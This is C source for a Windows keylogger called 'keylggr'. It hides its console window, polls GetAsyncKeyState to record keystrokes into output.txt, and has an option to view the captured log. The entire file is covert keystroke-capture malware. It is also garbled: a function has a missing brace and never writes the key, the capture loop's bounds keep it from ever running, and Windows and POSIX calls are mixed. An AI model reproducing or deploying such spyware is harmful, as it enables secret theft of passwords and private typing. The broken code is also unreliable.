#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winuser.h>
#include <unistd.h>

#define CLN_OPT      "rm -f output.txt"
#define CONS_WIN     "ConsoleWindowClass"
#define MAX_KEY      8
#define MIN_KEY      190
#define MLSB_PRESSED -32767
#define OPT_FILE     "output.txt"
#define OPT_STR      "lr"

// prints error message and exits the program.
void errexit (const char *errmsg) {
  printf ("%s\n", errmsg);
  exit (EXIT_FAILURE);
}

// saves a key to the output file.
void savekey (const char key) {
  FILE *lptr = fopen (OPT_FILE, "a");
  if (lptr == NULL) {
    errexit ("Error Creating Output File.");
  if (key == 1 || key == 2) { return ; }
  
}

// opens the last record of .output in less.
void lopen () {
  FILE *fptr = popen ("less", "w");
  FILE *lptr = fopen (OPT_FILE, "r");
  char *line = NULL;
  int status;
  size_t len = 0;
  ssize_t nread;
  
  // checking for error opening files.
  if (fptr == NULL || lptr == NULL) {
    errexit ("Error Opening File.");
  }
  
  // reading input from log into fptr.
  while ((nread = getline (&line, &len, lptr)) != -1) {
    fwrite (line, nread, 1, fptr);
  }
  
  // closing the file pointers.
  fclose (lptr);
  status = pclose(fptr);
  if (status == -1) {
    errexit ("Error Closing File.");
  }
}

// records new keystrokes.
void rmode () {
  HWND window = NULL;
  char c;
  
  // cleans the last record of .output so that new keystrokes can be logged.
  system (CLN_OPT);
  
  // allocating new window for keylogging.
  AllocConsole();
  window = FindWindowA (CONS_WIN, NULL);
  if (window == NULL) {
    errexit ("Window Creation Failed.");
  }
  ShowWindow (window, 0);
  
  // keylogging.
  while (true) {
    for (c = MIN_KEY; c <= MAX_KEY; c++) {
      // GetAsyncKeyState sets the MSB and LSB when a key has been pressed.
      if (GetAsyncKeyState (c) == MLSB_PRESSED) {
        // save the key.
        savekey (c);
      }
    }
  }
  
  // program finishes when user enters ctrl+c.
}

// main method: parses the command line arguments and takes appropriate action
int main (int argc, char **argv) {
  int opt = 0;
  int lflag = 0; // get log of the last keystrokes stored by keylggr
  int rflag = 0; // re-initialize keylggr (clearing out old data)
  
  // clean previous output if it exists.
  
  // parse command line arguments.
  while ((opt = getopt (argc, argv, OPT_STR)) != EOF) {
    switch (opt) {
      case 'l':
        lflag++;
        break;
      case 'r':
        rflag++;
        break;
      default:
        errexit ("INVALID ARGS: usage ./keylggr <-l | -r &>");
    }
  }
  
  // validate command line argumets: should be either -l or -r, NOT both.
  if (!(lflag ^ rflag)) {
    errexit ("INVALID ARGS: usage ./keylggr <-1 | -r &>");
  }
  
  // if l flag is set, retrieve the log of the last keystrokes stored.
  if (lflag) {
    lopen ();
  }
  
  // if r mode is set, clear previously stored keystrokes and record new strokes.
  if (rflag) {
    rmode ();
  }
  
  exit (EXIT_SUCCESS);
}
